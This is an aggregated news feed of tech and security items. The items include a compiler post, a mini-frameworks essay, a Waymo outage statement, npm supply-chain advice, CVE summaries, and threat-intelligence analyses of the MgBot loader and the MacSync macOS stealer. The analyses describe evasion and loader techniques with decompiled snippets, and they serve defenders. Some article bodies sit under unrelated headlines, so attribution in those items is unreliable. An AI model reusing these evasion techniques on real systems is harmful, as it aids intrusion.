burnout risk. In addition to this, the findings of the quantitative analyses showed how Super Mario and Yoshi games’ affordance of childlike wonder influenced happiness in life and significantly reduced burnout risk. These video games, hence, can be effective vehicles for enhanced mental well-being. More specifically, the current findings show that Super Mario Bros. and Yoshi games act as an effective antidote by creating a virtual space that is the psychological inverse of a burnout-inducing environment.In conclusion, the findings for this study demonstrate that popular video games, such as Super Mario Bros. and Yoshi, can enhance childlike wonder, which in turn increases overall happiness and reduces burnout risk. This work is innovative in identifying childlike wonder as a previously underexplored emotional mechanism that links everyday gameplay with improved well-being. It differs from prior studies that have focused mainly on escapism, stress relief, or need satisfaction by showing how mainstream entertainment games can evoke curiosity, playfulness, and joy that counteract cynicism and exhaustion. The study contributes to the growing field connecting gaming and mental health by positioning popular titles as restorative digital spaces rather than merely sources of distraction. Practically, the findings suggest that thoughtfully designed, low-pressure games may serve as simple, real-world tools to rekindle curiosity, uplift mood, and support resilience among young adults facing burnout.]]></content:encoded></item><item><title>Industry Continues to Push Back on HIPAA Security Rule Overhaul</title><link>https://databreaches.net/2025/12/24/industry-continues-to-push-back-on-hipaa-security-rule-overhaul/?pk_campaign=feed&amp;pk_kwd=industry-continues-to-push-back-on-hipaa-security-rule-overhaul</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 24 Dec 2025 13:34:38 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>When compilers surprise you</title><link>https://xania.org/202512/24-cunning-clang</link><author>brewmarche</author><category>dev</category><pubDate>Wed, 24 Dec 2025 13:27:50 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[When compilers surprise youWritten by me, proof-read by an LLM.
Details at end.Every now and then a compiler will surprise me with a really smart trick. When I first saw this optimisation I could hardly believe it. I was looking at loop optimisation, and wrote something like this simple function that sums all the numbers up to a given value:So far so decent: GCC has done some preliminary checks, then fallen into a loop that efficiently sums numbers using  (we’ve seen this before). But taking a closer look at the loop we see something unusual:The compiler has cleverly realised it can do two numbers at a time using the fact it can see we’re going to add , which is the same as adding . Very cunning, I think you’ll agree!If you turn the optimiser up to  you’ll see the compiler works even harder to vectorise the loop using parallel adds. All very clever.This is all for GCC. Let’s see what clang does with our code:This is where I nearly fell off my chair: ! Clang checks for positive , and if so it does:It was not at all obvious to me what on earth was going on here. By backing out the maths a little, this is equivalent to:v + ((v - 1)(v - 2) / 2) - 1;
Expanding the parentheses:v + (v² - 2v - v + 2) / 2 - 1
(v² - 3v + 2) / 2 + (v - 1)
Multiplying the  by 2 / 2:(v² - 3v + 2) / 2 + (2v - 2)/2
Combining those and cancelling:Simplifying and factoring gives us  which is the closed-form solution to the “sum of integers”! Truly amazing - we’ve gone from an O(n) algorithm as written, to an O(1) one!I love that despite working with compilers for more than twenty years, they can still surprise and delight me. The years of experience and work that have been poured into making compilers great is truly humbling, and inspiring.We’re nearly at the end of this series - there’s so much more to say but that will have to wait for another time. Tomorrow will be a little different: see you then!This post was written by a human (Matt Godbolt) and reviewed and proof-read by LLMs and humans.]]></content:encoded></item><item><title>FBI seizes domain storing bank credentials stolen from U.S. victims</title><link>https://www.bleepingcomputer.com/news/security/fbi-seizes-domain-storing-bank-credentials-stolen-from-us-victims/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 24 Dec 2025 13:17:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The U.S. government has seized the 'web3adspanels.org' domain and the associated database used by cybercriminals to host bank login credentials stolen in account takeover attacks.

Over time, I've seen one pattern came along again and again, causing endless pain for developers, that is, creating mini-frameworks.First, I'd like to give readers a sense of what I mean by "mini-frameworks". Imagine a company that has 1000 engineers, and they share the same tech stack. Over time, a team finds the shared tech stack unsatisfactory, either because they have to write boilerplate code over and over, or the performance is not good enough, or whatever. So they decided to create their own framework on  shared stack. You know it's a framework and not just a library, when you hear engineers present the work using concepts & terminologies they invented, as a way to actualize their mental model. Framework like this is what I called "mini-framework", with some common characteristics:Created by a small number of team(s) to solve their pain pointsWraps around the company/org-shared tech stack or frameworkIntroduce new concepts & terminologies that doesn't exist in the original stackCreators claim that the framework "magically" solves many problems, and push more people to use itIf you work for a big company, most likely you've seen or even done this. But why is it bad? Being a victim myself, I can share my story.Over the years, my team has been using a Google-internal framework to write distributed programs, and are gradually migrating our org's codebase onto it. This framework is well-designed and maintained by a dedicated team. We're generally happy with it, though it has some itchy points (not pain points). Being a strong and ambitious engineer, my manager proposed that we add an abstraction layer on top of it, with the aim to lower the barrier for org adoption, and solve those itchy points on the way. I was skeptical and tried convincing my manager not to do it, but failed. Eventually, several engineers spent quarters to add this abstraction layer, and now the fun begins.First, one author tried to adopt it in our existing codebase. People thought it would be easy, but it took like a year. Why? Because during the migration, they found that the abstraction cannot handle certain use cases, so they have to spend time patching it to make it work. In the meantime, other people like me were writing new code using the original framework, this again added new requirements and workload for migration. Eventually, after spending way more time than initially planned, the migration completed, and my manager decided that newly-written code should use our own framework.You think this is the end? Of course not!Since I started writing code with the new framework, there wasn't a single time that I didn't want to curse and quit the job. The framework is so hard to use, it introduced so many concepts with the intent to hide complexity, but ended up bringing more. Since I'm not the person who writes it, I'm not familiar with all tricks and hacks. As a result, what used to cost me a day to finish can now take two weeks, plus I have to constantly ask the author how to do certain things, and even booked pair-programming sessions. As I heard, other team members were having the same complaints. As for the original goal of driving adoption, ofc it didn't help (if not slower). What's funny is that, this layer is supposed to make people outside of our team write code more easily, but now even our own team are suffering from it. Looking back, part of the problem was caused by bad design and implementation, but the fundamental problem lies in creating the mini-framework in the first place. I've observed other mini-frameworks, they all sort of have the same problem, just some worse than the others. So I've come up with a few thoughts to explain why mini-frameworks are bad.Why mini-frameworks are bad?First, mini-frameworks lacks feature completeness and compatibility. People often think that they can magically "hide the unnecessary complexity", but in reality they can't. Even if the mini-framework can deal with 80% use cases well, they often lack the flexibility and features from the original framework to satisfy the rest 20%. DSL (Domain Specific Language) shares the same problem, and that's why people hate it so much.Second, mini-frameworks violates the ETC (Easier To Change) principle. I first learned the concept from the legendary book , and it still astonishes me that many programmers (even experienced ones) are not aware of it. Put simply, it suggests to write code in a way that allows future modifications be made easily. Creating mini-frameworks violates this principle in two ways:The mini-framework only models the current use cases to solve certain problems. When requirements change in the future, it often cannot keep up with it.Creating mini-framework often requires poking into the implementation details of the original framework, and those details were abstracted away for good reason: they can change at any time. The more implementation details that are relied upon, the harder for the maintaining team to evolve the original framework. Third, mini-frameworks is a realization of the creator's mental model, but it's not everyone's mental model. People who tend to create mini-framework are often more opinionated, which is a good thing by itself. But when you create things for others to use, being too opinionated can cause problems. I would even say that sometimes (not always), creating a mini framework directly reflects the author's ego, and they chose a framework because a tiny library don't recognize the "significance of the work".Fourth, mini-frameworks tend to cause tech stack fragmentation. I generated an image to show what I mean: part of the system is migrated, others are not. As new layers kept being added, over time it gets worse. Not sure if other companies are like this, but at Google, I've never actually seen a code migration fully complete, which is kinda hilarious.Last but also the most concerning: . Unlike shared infrastructure owned by dedicated teams, mini-frameworks were often owned by those 1 or 2 people who created it. Once they left the team or company, it becomes really hard to find successors — sure other team members may know roughly how things work, but certainly not as deep as the authors. Also, people lack the motivation to maintain existing stuff, because you don't get paid more or promoted doing this. Therefore, mini frameworks often die with the departure of the original authors, unless it has gained major adoption before that, which happens less likely than not.So, What Should You Do Instead?At this point, it's important to clarify what I'm against and what I'm not. I'm certainly not against adding abstractions——because abstractions are essentially, the program itself, we can't live without it. I'm against adding abstractions in a wrong way, and in the form that's not needed.Let me bring this up once again since it's really important:
The real and only difference between a library and a framework, is whether it introduces new concepts. The line can be blurry sometimes, but more often you can tell easily. For example, a library can include a set of subclasses or utility functions around the original framework, as they don't introduce new concepts. But if you see a README that starts with a "Glossary" section, you know it's 99.99% chance a framework (people may still refer to them as "libraries", but you get the idea).My point is, we should be really really careful introducing new concepts. If you can, avoid it. The cognitive load brought by a bunch of buzz words is heavier than people realized, and especially, what the  framework author can realize. Words are the mirror of someone's thought, same with code. The authors create concepts because it is how they model the problem inside their brain, it is how they think. That's why they claim the concepts are "natural and straightforward", while others are struggling to understand.So rule No.1, avoid creating mini-frameworks, create libraries instead. But in the cases where you do find it necessary to create a framework, my suggestions are:Link concepts to concrete business requirements, not something in your head.. Don't build a wrapper around the existing framework, build your own from scratch. Yes this would make it a major decision that requires more discussions and resources, but it avoids many of the aforementioned issues. After all, you have good business justification to do this, right.. Right? . Having seen many disasters caused by mini-frameworks, I can't help thinking if it's because people didn't take it seriously enough. My feeling is that, since people don't really understand the distinction between a library and a framework, both the initiator and reviewers of the decision tend to underthink it: "Oh it's just another abstraction, we do that all the time". As my story shows, it's really not. Creating and adopting a framework, whether mini or not, is always a serious decision, thus should be treated that way. By realizing the seriousness of this matter, I hope we can avoid making rashy decisions to create mini-frameworks that should not exist in the first place.comments powered by ]]></content:encoded></item><item><title>Urban VPN Proxy Surreptitiously Intercepts AI Chats</title><link>https://www.schneier.com/blog/archives/2025/12/urban-vpn-proxy-surreptitiously-intercepts-ai-chats.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Wed, 24 Dec 2025 12:03:03 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Urban VPN Proxy targets conversations across ten AI platforms: ChatGPT, Claude, Gemini, Microsoft Copilot, Perplexity, DeepSeek, Grok (xAI), Meta AI.For each platform, the extension includes a dedicated “executor” script designed to intercept and capture conversations.

Our latest research (June 2025) reveals that the attackers conducted highly-targeted campaigns, which started in November 2022 and ran until November 2024.The group mainly performed adversary-in-the-middle (AitM) attacks on specific victims. These included techniques such as dropping loaders into specific locations and storing encrypted parts of the malware on attacker-controlled servers, which were resolved as a response to specific website DNS requests. Notably, the attackers have developed a new loader that evades detection when infecting its targets, and even employed hybrid encryption practices to complicate analysis and make implants unique to each victim.Furthermore, the group has developed an injector that allows them to execute their MgBot implant in memory by injecting it into legitimate processes. It resides in the memory space of a decade-old signed executable by using DLL sideloading and enables them to maintain a stealthy presence in compromised systems for extended periods.The threat actor commonly uses lures that are disguised as new updates to known third-party applications or popular system applications trusted by hundreds of users over the years.In this campaign, the attackers used an executable disguised as an update package for SohuVA, which is a streaming app developed by Sohu Inc., a Chinese internet company. The malicious package, named sohuva_update_10.2.29.1-lup-s-tp.exe, clearly impersonates a real SohuVA update to deliver malware from the following resource, as indicated by our telemetry:http://p2p.hd.sohu.com[.]cn/foxd/gz?file=sohunewplayer_7.0.22.1_03_29_13_13_union.exe&new=/66/157/ovztb0wktdmakeszwh2eha.exeThere is a possibility that the attackers used a DNS poisoning attack to alter the DNS response of  to an attacker-controlled server’s IP address, while the genuine update module of the SohuVA application tries to update its binaries located in appdata\roaming\shapp\7.0.18.0\package. Although we were unable to verify this at the time of analysis, we can make an educated guess, given that it is still unknown what triggered the update mechanism.Furthermore, our analysis of the infection process has identified several additional campaigns pursued by the same group. For example, they utilized a fake updater for the iQIYI Video application, a popular platform for streaming Asian media content similar to SohuVA. This fake updater was dropped into the application’s installation folder and executed by the legitimate service . Upon execution, the fake updater initiated malicious activity on the victim’s system, and we have identified that the same method is used for IObit Smart Defrag and Tencent QQ applications.The initial loader was developed in C++ using the Windows Template Library (WTL). Its code bears a strong resemblance to Wizard97Test, a WTL sample application hosted on Microsoft’s GitHub. The attackers appear to have embedded malicious code within this project to effectively conceal their malicious intentions.The loader first decrypts the encrypted configuration buffer by employing an XOR-based decryption algorithm:for ( index = 0; index < v6; index = (index + 1) )
{
if ( index >= 5156 )
break;
mw_configindex ^= (&mw_deflated_config + (index & 3));
}
After decryption, it decompresses the LZMA-compressed buffer into the allocated buffer, and all of the configuration is exposed, including several components:Malware installation path: %ProgramData%\Microsoft\MFResource domain: http://www.dictionary.com/Resource URI: image?id=115832434703699686&product=dict-homepage.pngMgBot encrypted configurationThe malware also checks the name of the logged-in user in the system and performs actions accordingly. If the username is , the malware copies itself with a different name by appending the  suffix inside the current working directory. Then it uses the ShellExecuteW API to execute the newly created version. Notably, all relevant strings in the malware, such as  and , are encrypted, and the loader decrypts them with a specific XOR algorithm.Decryption routine of encrypted stringsIf the username is not , the malware first copies  into %TEMP%, naming the instance as  (where  is an incremented decimal number), and then deletes the original file. The purpose of this activity is unclear, but it consumes high system resources. Next, the loader decrypts the  and  strings to retrieve their base addresses by calling the GetProcAddress API. Afterwards, it uses a single-byte XOR key to decrypt the shellcode, which is 9556 bytes long, and stores it at the same address in the  section. Since the  section does not have execute permission, the malware uses the VirtualProtect API to set the permission for the section. This allows for the decrypted shellcode to be executed without alerting security products by allocating new memory blocks. Before executing the shellcode, the malware prepares a 16-byte-long parameter structure that contains several items, with the most important one being the address of the encrypted MgBot configuration buffer.Multi-stage shellcode executionAs mentioned above, the loader follows a unique delivery scheme, which includes at least two stages of payload. The shellcode employs a hashing algorithm known as PJW to resolve Windows APIs at runtime in a stealthy manner.unsigned int calc_PJWHash(_BYTE *a1)
{
unsigned int v2;
v2 = 0;
while ( *a1 )
{
v2 = *a1++ + 16 * v2;
if ( (v2 & 0xF0000000) != 0 )
v2 = ~(v2 & 0xF0000000) & (v2 ^ ((v2 & 0xF0000000) >> 24));
}
return v2;
}
The shellcode first searches for a specific DAT file in the malware’s primary installation directory. If it is found, the shellcode decrypts it using the CryptUnprotectData API, a Windows API that decrypts protected data into allocated heap memory, and ensures that the data can only be decrypted on the particular machine by design. After decryption, the shellcode deletes the file to avoid leaving any traces of the valuable part of the attack chain.If, however, the DAT file is not present, the shellcode initiates the next-stage shellcode installation process. It involves retrieving encrypted data from a web source that is actually an attacker-controlled server, by employing a DNS poisoning attack. Our telemetry shows that the attackers successfully obtained the encrypted second-stage shellcode, disguised as a PNG file, from the legitimate website . However, upon further investigation, it was discovered that the IP address associated with  had been manipulated through a DNS poisoning technique. As a result, victims’ systems were resolving the website to different attacker-controlled IP addresses depending on the victims’ geographical location and internet service provider.To retrieve the second-stage shellcode, the first-stage shellcode uses the RtlGetVersion API to obtain the current Windows version number and then appends a predefined string to the HTTP header:sec-ch-ua-platform: windows %d.%d.%d.%d.%d.%d
This implies that the attackers needed to be able to examine request headers and respond accordingly. We suspect that the attackers’ collection of the Windows version number and its inclusion in the request headers served a specific purpose, likely allowing them to target specific operating system versions and even tailor their payload to different operating systems. Given that the Evasive Panda threat actor has been known to use distinct implants for Windows (MgBot) and macOS (Macma) in previous campaigns, it is likely that the malware uses the retrieved OS version string to determine which implant to deploy. This enables the threat actor to adapt their attack to the victim’s specific operating system by assessing results on the server side.Downloading a payload from the web resourceFrom this point on, the first-stage shellcode proceeds to decrypt the retrieved payload with a XOR decryption algorithm:key = *(mw_decryptedDataFromDatFile + 92);
index = 0;
if ( sz_shellcode )
{
mw_decryptedDataFromDatFile_1 = Heap;
do
{
*(index + mw_decryptedDataFromDatFile_1) ^= *(&key + (index & 3));
++index;
}
while ( index < sz_shellcode );
}
The shellcode uses a 4-byte XOR key, consistent with the one used in previous stages, to decrypt the new shellcode stored in the DAT file. It then creates a structure for the decrypted second-stage shellcode, similar to the first stage, including a partially decrypted configuration buffer and other relevant details.Next, the shellcode resolves the VirtualProtect API to change the protection flag of the new shellcode buffer, allowing it to be executed with  permissions. The second-stage shellcode is then executed, with the structure passed as an argument. After the shellcode has finished running, its return value is checked to see if it matches . Depending on the outcome, the shellcode will either terminate its own process or return control to the caller.Although we were unable to retrieve the second-stage payload from the attackers’ web server during our analysis, we were able to capture and examine the next stage of the malware, which was to be executed afterwards. Our analysis suggests that the attackers may have used the CryptProtectData API during the execution of the second shellcode to encrypt the entire shellcode and store it as a DAT file in the malware’s main installation directory. This implies that the malware writes an encrypted DAT file to disk using the CryptProtectData API, which can then be decrypted and executed by the first-stage shellcode. Furthermore, it appears that the attacker attempted to generate a unique encrypted second shellcode file for each victim, which we believe is another technique used to evade detection and defense mechanisms in the attack chain.We identified a secondary loader, named , which was disguised as a legitimate Windows library and used by the Evasive Panda group to achieve a stealthier loading mechanism. Notably, this malicious DLL loader relies on a legitimate, signed executable named  (MD5: 1c36452c2dad8da95d460bee3bea365e), which is an older version of . This executable is a Python wrapper that normally imports the  library and calls the  function.The secondary loader retrieves the full path of the current module () and writes it to a file named , located in C:\ProgramData\Microsoft\eHome, but only if a file with the same name does not already exist in that directory. We believe with a low-to-medium level of confidence that this action is intended to allow the attacker to potentially update the secondary loader in the future. This suggests that the attacker may be planning for future modifications or upgrades to the malware.The malware proceeds to decrypt the next stage by reading the entire contents of C:\ProgramData\Microsoft\eHome\perf.dat. This file contains the previously downloaded and XOR-decrypted data from the attacker-controlled server, which was obtained through the DNS poisoning technique as described above. Notably, the implant downloads the payload several times and moves it between folders by renaming it. It appears that the attacker used a complex process to obtain this stage from a resource, where it was initially XOR-encrypted. The attacker then decrypted this stage with XOR and subsequently encrypted and saved it to  using a custom hybrid of Microsoft’s Data Protection Application Programming Interface (DPAPI) and the RC5 algorithm.General overview of storing payload on disk by using hybrid encryptionThis custom encryption algorithm works as follows. The RC5 encryption key is itself encrypted using Microsoft’s DPAPI and stored in the first 16 bytes of . The RC5-encrypted payload is then appended to the file, following the encrypted key. To decrypt the payload, the process is reversed: the encrypted RC5 key is first decrypted with DPAPI, and then used to decrypt the remaining contents of , which contains the next-stage payload.The attacker uses this approach to ensure that a crucial part of the attack chain is secured, and the encrypted data can only be decrypted on the specific system where the encryption was initially performed. This is because the DPAPI functions used to secure the RC5 key tie the decryption process to the individual system, making it difficult for the encrypted data to be accessed or decrypted elsewhere. This makes it more challenging for defenders to intercept and analyze the malicious payload.After completing the decryption process, the secondary loader initiates the runtime injection method, which likely involves the use of a custom runtime DLL injector for the decrypted data. The injector first calls the DLL entry point and then searches for a specific export function named . Although we were unable to determine which encrypted module was decrypted and executed in memory due to a lack of available data on the attacker-controlled server, our telemetry reveals that an MgBot variant is injected into the legitimate  process after the secondary loader is executed. Fortunately, this allowed us to analyze these implants further and gain additional insights into the attack, as well as reveal that the encrypted initial configuration was passed through the infection chain, ultimately leading to the execution of MgBot. The configuration file was decrypted with a single-byte XOR key, , and this would lead to the full exposure of the configuration.Our analysis suggests that the configuration includes a campaign name, hardcoded C2 server IP addresses, and unknown bytes that may serve as encryption or decryption keys, although our confidence in this assessment is limited. Interestingly, some of the C2 server addresses have been in use for multiple years, indicating a potential long-term operation.Decryption of the configuration in the injected MgBot implantOur telemetry has detected victims in Türkiye, China, and India, with some systems remaining compromised for over a year. The attackers have shown remarkable persistence, sustaining the campaign for two years (from November 2022 to November 2024) according to our telemetry, which indicates a substantial investment of resources and dedication to the operation.The techniques, tactics, and procedures (TTPs) employed in this compromise indicate with high confidence that the Evasive Panda threat actor is responsible for the attack. Despite the development of a new loader, which has been added to their arsenal, the decade-old MgBot implant was still identified in the final stage of the attack with new elements in its configuration. Consistent with previous research conducted by several vendors in the industry, the Evasive Panda threat actor is known to commonly utilize various techniques, such as supply-chain compromise, Adversary-in-the-Middle attacks, and watering-hole attacks, which enable them to distribute their payloads without raising suspicion.The Evasive Panda threat actor has once again showcased its advanced capabilities, evading security measures with new techniques and tools while maintaining long-term persistence in targeted systems. Our investigation suggests that the attackers are continually improving their tactics, and it is likely that other ongoing campaigns exist. The introduction of new loaders may precede further updates to their arsenal.As for the AitM attack, we do not have any reliable sources on how the threat actor delivers the initial loader, and the process of poisoning DNS responses for legitimate websites, such as , is still unknown. However, we are considering two possible scenarios based on prior research and the characteristics of the threat actor: either the ISPs used by the victims were selectively targeted, and some kind of network implant was installed on edge devices, or one of the network devices of the victims — most likely a router or firewall appliance — was targeted for this purpose. However, it is difficult to make a precise statement, as this campaign requires further attention in terms of forensic investigation, both on the ISPs and the victims.The configuration file’s numerous C2 server IP addresses indicate a deliberate effort to maintain control over infected systems running the MgBot implant. By using multiple C2 servers, the attacker aims to ensure prolonged persistence and prevents loss of control over compromised systems, suggesting a strategic approach to sustaining their operations.

We know trust is built through consistent behavior over time—earned through every mile we drive and every interaction we have with the community. This past Saturday, as a widespread PG&E outage cut power to nearly one-third of San Francisco, our service was put to the test. With power now restored, we want to share an account of our operations during the outage and how we are evolving to better serve the city.The scale of the outage and the sheer number of disabled traffic lights were the primary contributors to city-wide gridlock. As signals went dark across major corridors, the resulting congestion required law enforcement to manually manage intersections. The situation was severe enough that the San Francisco Department of Emergency Management advised residents to stay home, underscoring the extraordinary nature of the weekend’s disruptions.Navigating an event of this magnitude presented a unique challenge for autonomous technology. While the Waymo Driver is designed to handle dark traffic signals as four-way stops, it may occasionally request a confirmation check to ensure it makes the safest choice. While we successfully traversed more than 7,000 dark signals on Saturday, the outage created a concentrated spike in these requests. This created a backlog that, in some cases, led to response delays contributing to congestion on already-overwhelmed streets.We established these confirmation protocols out of an abundance of caution during our early deployment, and we are now refining them to match our current scale. While this strategy was effective during smaller outages, we are now implementing fleet-wide updates that provide the Driver with specific power outage context, allowing it to navigate more decisively.As the outage persisted and City officials urged residents to stay off the streets to prioritize first responders, we temporarily paused our service in the area. We directed our fleet to pull over and park appropriately so we could return vehicles to our depots in waves. This ensured we did not further add to the congestion or obstruct emergency vehicles during the peak of the recovery effort.We’ve always focused on developing the Waymo Driver for the world as it is, including when infrastructure fails. We are analyzing the event, and are already integrating the lessons from this weekend’s PG&E outage. Here are some of the immediate steps we’re taking:Integrating more information about outages: While our Driver already handles dark traffic signals as four-way stops, we are now rolling out fleet-wide updates that give our vehicles even more context about regional outages, allowing them to navigate these intersections more decisively.Updating our emergency preparedness and response: We will improve our emergency response protocols, incorporating lessons from this event. In San Francisco, we’ll continue to coordinate with Mayor Lurie’s team to identify areas of greater collaboration in our existing emergency preparedness plans.Expanding our first responder engagement: To date, we’ve trained more than 25,000 first responders in the U.S. and around the world on how to interact with Waymo. As we discover learnings from this and other widespread events, we’ll continue updating our first responder training.Undaunted in our mission to make our streets saferWe live and work in San Francisco, and we are grateful to the city’s first responders for their tireless work, and to Mayor Lurie for his leadership.Backed by 100M+ miles of fully autonomous driving experience and a  of improving road safety, we are undaunted by the opportunity to challenge the status quo of our roads, and we’re proud to continue serving San Franciscan residents and visitors.]]></content:encoded></item><item><title>The Hard-Coded Backdoor: Critical 9.8 Severity NVIDIA Flaws Grant Total Control of AI Systems</title><link>https://securityonline.info/the-hard-coded-backdoor-critical-9-8-severity-nvidia-flaws-grant-total-control-of-ai-systems/</link><author></author><category>security</category><pubDate>Wed, 24 Dec 2025 01:37:08 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[The Hard-Coded Backdoor: Critical 9.8 Severity NVIDIA Flaws Grant Total Control of AI Systems

The most recent example is the multi-wave Shai-Hulud campaign.

While individual incidents differ in their mechanics and speed, the pattern is consistent: Adversaries learn quickly, target maintainer workflows, and exploit trust boundaries in publication pipelines.

This post distills durable lessons and actions to help maintainers and organizations harden their systems and prepare for the next campaign, not just respond to the last one. We also share more about what’s next on the npm security roadmap over the next two quarters.

## Recent Shai-Hulud Campaigns

Shai-Hulud is a coordinated, multi-wave campaign targeting the JavaScript supply chain and evolved from opportunistic compromises to engineered, targeted attacks.

The first wave focused on abusing compromised maintainer accounts. It injected malicious post install scripts to slip malicious code into packages, exfiltrate secrets, and self-replicate, demonstrating how quickly a single foothold can ripple across dependencies.

The second wave, referred to as Shai-Hulud 2.0, escalated the threat: Its ability to self-replicate and spread via compromised credentials was updated to enable cross-victim credential exposure. The second wave also introduced endpoint command and control via self-hosted runner registration, harvesting a wider range of secrets to fuel further propagation, and destructive functionality. This wave added a focus on CI environments, changing its behavior when it detects it is running in this context and including privilege escalation techniques targeted to certain build agents. It also used a multi-stage payload that was harder to detect than the previous wave payload. The shortened timeline between variants signals an organized adversary studying community defenses and rapidly iterating around them.

Rather than isolated breaches, the Shai-Hulud campaigns target trust boundaries in maintainer workflows and CI publication pipelines, with a focus on credential harvesting and install-time execution. The defining characteristics we see across waves include:

- **Credential-adjacent compromise:** Attackers gain initial footholds via compromised credentials or OAuth tokens, then pivot to collect additional secrets (npm tokens, CI tokens, cloud credentials) to expand reach. This enables reuse across organizations and future waves without a single point of failure.
- **Install-time execution with obfuscation:** Malicious post-install or lifecycle scripts are injected into packages (or dependency chains) and only reveal behavior at runtime. Payloads are often conditionally activated (e.g., environment checks, org scopes) and exfiltrate data using techniques tailored to the environment it is running in.
- **Targeting trusted namespaces and internal package names:** The campaign affected popular and trusted packages, and the worm published infected packages with existing package names. The second wave also patched the version number of the package to make the infected packages look like legitimate updates and blend in with normal maintainer activity.
- **Rapid iteration and engineering around defenses:** Short intervals between variants and deliberate changes to bypass previous mitigations indicate an organized campaign mindset. The goal is durable access and scalable spread, not one-off opportunism.
- **Review blind spots in publication pipelines:** Differences between source and published artifacts, lifecycle scripts, and build-time transformations create gaps where injected behavior can land without notice if teams lack artifact validation or staged approvals.

Recent waves in this pattern reinforce that defenders should harden publication models and credential flows proactively, rather than tailoring mitigations to any single variant.

## What’s Next for npm

We’re accelerating our security roadmap to address the evolving threat landscape. Moving forward, our immediate focus is on adding support for:

- **Bulk OIDC onboarding**: Streamlined tooling to help organizations migrate hundreds of packages to trusted publishing at scale.
- **Expanded OIDC provider support**: Adding support for additional CI providers beyond GitHub Actions and GitLab.
- **Staged publishing**: A new publication model that gives maintainers a review period before packages go live, with MFA-verified approval from package owners. This empowers teams to catch unintended changes before they reach downstream users—a capability the community has been requesting for years.

Together, these investments give maintainers stronger, more flexible tools to secure their packages at every stage of the publication process.

## Advice for GitHub and npm users and maintainers

Malware like Shai-Hulud often spreads by adding malicious code to npm packages. The malicious code is executed as part of the installation of the package so that any npm user who installs the package is compromised. The malware scavenges the local system for tokens, which it can then use to continue propagating. Since npm packages often have many dependencies, by adding malware to one package, the attacker can indirectly infect many other packages. And by hoarding some of the scavenged tokens rather than using them immediately, the attacker can launch a new campaign weeks or months after the initial compromise.

In the “References” section below, we have included links to longer articles with analysis of recent campaigns and advice on how to stay secure, so we won’t rehash all of that information here. Instead, here is a short summary of our top recommendations:

### Advice for everyone

- Enable phishing-resistant MFA on all your accounts, particularly for GitHub package managers like npm, PyPI, RubyGems, or NuGet, and also any accounts that could be leveraged for account takeover or phishing, like email and social media accounts.
- Always set an expiration date on tokens to ensure that they’re rotated on a regular schedule. Organizations can enforce a maximum lifetime policy.
- Audit and revoke access for unused GitHub/OAuth apps.
- Use a sandbox, such as GitHub Codespaces or a virtual machine or container, for development work. This limits the access of any malware that you accidentally run.

### Advice for maintainers

- Enable branch protection so that malicious updates cannot be pushed directly to your main branch, even if the attacker has access to a valid token.
- Use npm trusted publishing instead of tokens. Trusted publishing is also available for other package managers such as PyPI, RubyGems, and NuGet.
- Pin CI dependencies, enable code scanning, and don’t forget to _resolve_ the code scanning alerts!
- Monitor package artifacts and validate published tarballs/bundles against source (e.g., SRI or artifact build attestations).

Note that the above advice is preventative. If you believe you are a victim of an attack and need help securing your GitHub or npm account, please contact GitHub Support.

LangChain is a framework for building LLM-powered applications. Prior to @langchain/core versions 0.3.80 and 1.1.8, and prior to langchain versions 0.3.37 and 1.2.3, a serialization injection vulnerability exists in LangChain JS's toJSON() method (and subsequently when string-ifying objects using JSON.stringify(). The method did not escape objects with 'lc' keys when serializing free-form data in kwargs. The 'lc' key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data. This issue has been patched in @langchain/core versions 0.3.80 and 1.1.8, and langchain versions 0.3.37 and 1.2.3

continuwuity is a Matrix homeserver written in Rust. Prior to version 0.5.0, this vulnerability allows a remote, unauthenticated attacker to force the target server to cryptographically sign arbitrary membership events. The flaw exists because the server fails to validate the origin of a signing request, provided the event's state_key is a valid user ID belonging to the target server. This issue has been patched in version 0.5.0. A workaround for this issue involves blocking access to the PUT /_matrix/federation/v2/invite/{roomId}/{eventId} endpoint using the reverse proxy.

What initially appeared to be a straightforward Swift downloader revealed itself to be a well-engineered three-stage attack chain with some interesting anti-analysis and evasion techniques.Concurrent analysis by Jamf Threat Labs has confirmed this sample is a variant of , a macOS infostealer operating under the Malware-as-a-Service (MaaS) model. The threat actor operates under the alias “mentalpositive” on underground forums. Apple has since revoked the developer certificate (Team ID ).The sample, which I’m calling UserSyncWorker based on its internal naming, operates through a carefully orchestrated infection chain. The first stage is a Swift-based Mach-O binary that functions as a downloader, pulling a Zsh wrapper script from its primary C2 at . That wrapper contains a Base64 and Gzip encoded payload which, when decoded, communicates with a secondary C2 at  to retrieve AppleScript commands and exfiltrate harvested data.What makes this sample notable is its defense evasion. The downloader programmatically strips the  extended attribute before executing downloaded payloads, bypassing Gatekeeper. Rate limiting logic prevents rapid re-execution, likely to frustrate sandbox analysis. Code signature validation ensures only payloads signed with a specific TeamIdentifier execute. These are not commodity malware techniques.The final stage retrieves AppleScript dynamically via HTTP and pipes it directly to  for execution. Collected data ends up archived at  before exfiltration. That “osalogging” naming convention is a strong indicator of keystroke logging or credential harvesting functionality.Let us walk through the analysis.malware (original name unknown)Mach-O 64-bit x86-64 executable06c74829d8eee3c47e17d01c41361d314f12277d899cc9dfa789fe767c03693eaa3804744ef482e6c509a77511f98667Not recovered (Swift binary)OSX.MacSync.B (MacSync Stealer)Before diving into the technical details, here is how the full infection chain operates:The stages unfold as follows:: Creates ~/Library/Application Support/UserSyncWorker/ for state persistence and ~/Library/Logs/UserSyncWorker.log for activity logging.: Issues an HTTP request to  using a dispatch semaphore for synchronous execution. Classic “am I online” check.: Reads  to determine if sufficient time has elapsed since previous execution. This prevents rapid re-execution and likely evades automated sandbox analysis that only observes short execution windows.: Downloads Stage 2 from  using curl with enforced TLS 1.2 minimum. ETag headers are cached to  for conditional GET requests, reducing network noise.: Validates the payload’s code signature using  and . Only payloads signed with TeamIdentifier  